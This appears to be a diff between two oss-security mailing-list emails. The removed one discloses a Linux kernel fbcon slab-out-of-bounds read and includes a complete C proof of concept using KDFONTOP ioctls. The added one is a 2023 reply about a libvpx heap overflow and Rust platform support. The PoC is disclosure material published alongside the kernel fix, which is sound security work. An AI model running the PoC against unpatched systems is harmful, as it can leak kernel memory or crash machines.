@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1962" "Monday" "9" "November" "2020" "22:41:51" "+0800" "Minh Yuan" "yuanmingbuaa@gmail.com" "<CAH5WSp7m3OW4zoxCgK5a4+Y3GgWK6jS4=jxHTaXS7bfp2_jgNQ@mail.gmail.com>" "70" "[oss-security] Linux kernel slab-out-of-bounds Read in fbcon" nil nil nil "11" "2020110914:41:51" "[oss-security] Linux kernel slab-out-of-bounds Read in fbcon" (number mark "U       yuanmingbuaa Nov  9   70/1962  " thread-indent "\"[oss-security] Linux kernel slab-out-of-bounds Read in fbcon\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel slab-out-of-bounds Read in fbcon" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 9906 invoked by uid 550); 9 Nov 2020 14:55:44 -0000
+Received: (qmail 21709 invoked by uid 550); 29 Sep 2023 18:56:06 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,107 +7,109 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3460 invoked from network); 9 Nov 2020 14:42:39 -0000
+Received: (qmail 25716 invoked from network); 29 Sep 2023 18:29:40 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=N+iGqICt1X4jKDzT1ToRePl6YBprNGLR+q2I7jGTQ0k=;
-        b=d+GWkymzpKJqYZlEdBoO24dhH0Z5jBErSd7S4XuK+eoAolCJb8B/7NCyRR5nl8nvIG
-         TxIh0WAimAsSgIE77wrvs6NytUsiywG48CvYQHVqr2UTKOmB8zV1VsnP6tzPCN3UJBxE
-         eeAYXbPzkwHluCoR63/JpAGzvrKZ+HJKBF2n6yIXeurBCNYb4I0o1/NoZw1pMNM7kW97
-         pci6MlmE/3Yb5OxBKAiLmL3+1CxEmANpmfX/t/u9u2bngujwdN6pOj6b6XA13xtvhpRQ
-         7wGHike9CJGEmjXDi5ko2VrmrE+8MFzxKAELgoiZ3B79NrJtFa4QhsKt5gIX05Lx5inJ
-         6x/g==
+        d=gmail.com; s=20230601; t=1696012168; x=1696616968; darn=lists.openwall.com;
+        h=content-transfer-encoding:to:subject:message-id:date:from:reply-to
+         :in-reply-to:references:mime-version:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=ta6fKZ6Te4fvAOoaCqze0tH+JFRHAFz2ohU+Zz3O+XA=;
+        b=b5/K9VLlwJUt705wSVxYxOWlOLAc//cVgv+GrDZDVTFFY1WkfFYI76enm7nOJwYymw
+         SsSubYk/z3PQ+aq/hXz7gj6u7N1WQuXPPy5kA6tydAzxFZhnvXslc9hGWX76DSmqr7Oc
+         iSPCr5//zfHVbArAY5geJE4BiOP0GGYy5NQmv7ibBQYzfgrSjwjnR5VC+L9tHZClsoDF
+         U90nhnM/hrYRROPSXXwtcO4ZH9LHBoaO0bz437QrrSiG91PeBTt+jz8G983eVs+1itqO
+         epVITBqXi3e2WvsLNsZslaqXStkyTsaa1pdsXh+Owg0iL5TaLAKptWFOIyVWKs9ao96C
+         Fh2g==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=N+iGqICt1X4jKDzT1ToRePl6YBprNGLR+q2I7jGTQ0k=;
-        b=DRmg/T1pqNgWjkLLg7qbv/zIzeXexexlRD4fnZ9B6CnAcXjYMLPVxv9ReDYgfkkSDf
-         YcN9MD4R1Ds4bBxzqa2euMEHQWzdzjt2CsE73jnLxOKaqr8OaMW21NcqnIbbUIiowzV7
-         N0hc/umBu80QuFYObltbSu3MEKY8JqhiLs49dJVyqzA/YzEeBDgvwrdlTS21hMkAKlPX
-         p8mI5RAxH59QSk7abadnJXMN8nPtEAygFhmS2S8HTf6gZfcl/dVmrJykFEjR3hsu+A/R
-         +DQL0GWOKJoEHx6dgKn0PE5k1ToxHUoEITEU/xzbmKPl7LE7wXM6QeGjeft7RUiOes0a
-         7oCQ==
-X-Gm-Message-State: AOAM531HXakv07Yg9kUGoLMWmOpg/aP2V1LgS9OareeM2QIEeOYMgEtP
-	jG6SxNZJxN5WLZ1mZ0wYlekR6MYIe+/9t0kBRb2sMPmqhAZsjw==
-X-Google-Smtp-Source: ABdhPJwja+vVwReE7B5HsKh4VwIdDufm7LKZ2FwdEhmr90pF8F027ylwYrNJThD/e1X7vKuA/vxGE5CkqzBIXp1eM4s=
-X-Received: by 2002:a17:906:26c2:: with SMTP id u2mr14625549ejc.529.1604932947502;
- Mon, 09 Nov 2020 06:42:27 -0800 (PST)
+        d=1e100.net; s=20230601; t=1696012168; x=1696616968;
+        h=content-transfer-encoding:to:subject:message-id:date:from:reply-to
+         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to;
+        bh=ta6fKZ6Te4fvAOoaCqze0tH+JFRHAFz2ohU+Zz3O+XA=;
+        b=Kk+iNKwBD0uAcrGCicRLju5ptLyt5wn+9VyvBRy70/JELflI8B1QQI/NbL67JSmupg
+         nYUZk/nuW0IGr6dyty2sKtFy88d8uWGIk4lhivVEyTAsNVvilyARkIumz/O1WV5hkm+I
+         9iNGmYE0HcUPO2tPFlg37Fh40JWi2s2W6HOHBi7TLjcdT0DXoqSla6A6vgrUFXG2qyoP
+         4EKZgrvB9GiBZk2hSHiOtHsRGV17UTB3Pog1yODf5XclAlNjZzSR/unyy58gE3aoCIVI
+         Bja+T7VyEd/KWv9CakyaPKrohME32w9NM/8ZGH+4R2f7kALQKuz2oCGK+vEjjleDfPxC
+         o77A==
+X-Gm-Message-State: AOJu0Yx/hp97AEw6AVWbJCwCREANAgOxyzRXHdF4BaK9SU4NFg/rnsSA
+	KsFT4pm4DrJ4rSM4xmRk5SM6QdDRA4wSiWYkQb0WUjIF0g4=
+X-Google-Smtp-Source: AGHT+IGLHFnnzdejL5GPGwQg3ow4nSR5+AxOpKFbbFzldU7fIUHI1yDMvgf28Y9XYVDIAHhhpVPy9q7FKnw22AskdJw=
+X-Received: by 2002:a05:6808:10:b0:3a4:8140:97e8 with SMTP id
+ u16-20020a056808001000b003a4814097e8mr5082890oic.14.1696012168117; Fri, 29
+ Sep 2023 11:29:28 -0700 (PDT)
 MIME-Version: 1.0
-From: Minh Yuan <yuanmingbuaa@gmail.com>
-Date: Mon, 9 Nov 2020 22:41:51 +0800
-Message-ID: <CAH5WSp7m3OW4zoxCgK5a4+Y3GgWK6jS4=jxHTaXS7bfp2_jgNQ@mail.gmail.com>
+References: <bd99e07a-8d8c-4652-9089-7c0fc2e86409@oracle.com> <ZRXlPoozp5n+cWv1@itl-email>
+In-Reply-To: <ZRXlPoozp5n+cWv1@itl-email>
+From: Jeffrey Walton <noloader@gmail.com>
+Date: Fri, 29 Sep 2023 14:29:17 -0400
+Message-ID: <CAH8yC8mV5LGBhbFHo+u7j7xWGbKS5_tOPiGA=1XhwCg65-Dj3A@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="000000000000396aaf05b3ad9235"
-Subject: [oss-security] Linux kernel slab-out-of-bounds Read in fbcon
-
---000000000000396aaf05b3ad9235
 Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+Subject: Re: [oss-security] CVE-2023-5217: Heap buffer overflow in vp8
+ encoding in libvpx
 
-Hi,
+On Thu, Sep 28, 2023 at 5:10=E2=80=AFPM Demi Marie Obenour
+<demi@invisiblethingslab.com> wrote:
+>
+> On Thu, Sep 28, 2023 at 11:37:23AM -0700, Alan Coopersmith wrote:
+> > Google has announced another media parsing bug, this time correctly doc=
+umenting
+> > both the base library and Chrome versions affected in the CVE.
+> >
+> > https://www.cve.org/CVERecord?id=3DCVE-2023-5217 states:
+> >
+> >    Heap buffer overflow in vp8 encoding in libvpx in Google Chrome prio=
+r to
+> >    117.0.5938.132 and libvpx 1.13.1 allowed a remote attacker to potent=
+ially
+> >    exploit heap corruption via a crafted HTML page.
+> >    (Chromium security severity: High)
+> >
+> > Unfortunately, the bug report it points to is restricted access still:
+> > https://crbug.com/1486441
+> >
+> > But the Chrome release notes state:
+> >    Google is aware that an exploit for CVE-2023-5217 exists in the wild.
+> > https://chromereleases.googleblog.com/2023/09/stable-channel-update-for=
+-desktop_27.html
+> >
+> > Mozilla has put out their own security advisory at
+> > https://www.mozilla.org/en-US/security/advisories/mfsa2023-44/
+> > and delivered fixes in Firefox 118.0.1, Firefox ESR 115.3.1,
+> > Firefox Focus for Android 118.1, and Firefox for Android 118.1.
+> >
+> > https://bugzilla.mozilla.org/show_bug.cgi?id=3D1855550 is also still
+> > restricted access.
+> >
+> > It does not appear that libvpx 1.13.1 has been released yet, but there
+> > are two commits in its git repo with the 1486441 bug id listed:
+> >
+> > https://github.com/webmproject/libvpx/commit/3fbd1dca6a4d2dad332a2110d6=
+46e4ffef36d590
+> > https://github.com/webmproject/libvpx/commit/af6dedd715f4307669366944cc=
+a6e0417b290282
+> >
+> > Mozilla's commit references these two libvpx commit ids as well:
+> > https://hg.mozilla.org/mozilla-central/rev/c53f5ef77b62b79af86951a7f913=
+0e1896b695d2
+>
+> How long will it take for corporations to accept that writing media
+> codecs in C, C++, or any other memory-unsafe language is a fundamentally
+> bad idea, and that it is better to rewrite the codecs in a safe language
+> (such as Wuffs or Rust) than to try to secure the existing ones?
 
-We recently discovered a slab-out-of-bounds read in fbcon in the latest
-kernel ( v5.10-rc2 for now).
+Small nit... Folks would lose a lot of platforms by selecting Rust.
+Rust is only guaranteed to work on a handful of platforms. At this
+time, it looks like it is i686 and x86_64. Confer,
+<https://doc.rust-lang.org/nightly/rustc/platform-support.html>.
 
-The root cause of this vulnerability is that "fbcon_copy_font" did not
-handle "vc->vc_font.data" and "vc->vc_font.height" consistently. However,
-the patch <https://lkml.org/lkml/2020/9/27/223> for VT_RESIZEX and the patch
-<https://lkml.org/lkml/2020/9/24/720> for fbcon_get_font() can't handle
-this issue.
+And that's been my experience with Rust. For a new project I worked
+on, Rust only worked on x86_64. It could not compile its own cargos on
+armv7, aarch64 or powerpc. We had to (re)start a project from scratch
+after that. And it got written in C, though we should have done it in
+C++. We lost so much time due to Rust we did not have the cycles to
+move from C to C++.
 
-This is my PoC (it needs the privilege to access tty to trigger this bug):
-
-// author by ziiiro@THU
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/ioctl.h>
-#include <fcntl.h>
-#include <linux/fb.h>
-#include <linux/vt.h>
-#include <linux/kd.h>
-#include <string.h>
-
-int main(int argc, char** argv)
-{
-    struct console_font_op op;
-    struct consolefontdesc cfdarg;
-    void *addr = malloc(0x100);
-    memset(addr,'a',0x100);
-    int fd1 = open("/dev/tty1", O_RDWR, 0);
-    int fd2 = open("/dev/tty6", O_RDWR, 0);
-    op.op = KD_FONT_OP_SET;
-    op.width = 8;
-    op.height = 1;
-    op.data = addr;
-    op.charcount = 0x100;
-    // alloc a samll font.data
-    ioctl(fd2,KDFONTOP,&op);
-    op.height = 0x20;
-    // set a large font.height
-    ioctl(fd1, KDFONTOP, &op);
-    op.op = KD_FONT_OP_COPY;
-    // access tty6's font
-    op.height = 5;
-    // use a larger height (tty1) to access the small font.data (tty6)
-    ioctl(fd1,KDFONTOP,&op);
-}
-
-The patch for this bug is available: commit
-3c4e0dff2095c579b142d5a0693257f1c58b4804 (
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c4e0dff2095c579b142d5a0693257f1c58b4804
-)
-
-Timeline:
-* 6/11/20 - Vulnerability reported to security@kernel.org and
-linux-distros@vs.openwall.org.
-* 9/11/20 - Vulnerability patched.
-* 9/11/20 - Vulnerability public.
-
-Regards,
-
-Yuan Ming from Tsinghua University
-
---000000000000396aaf05b3ad9235--
+Jeff
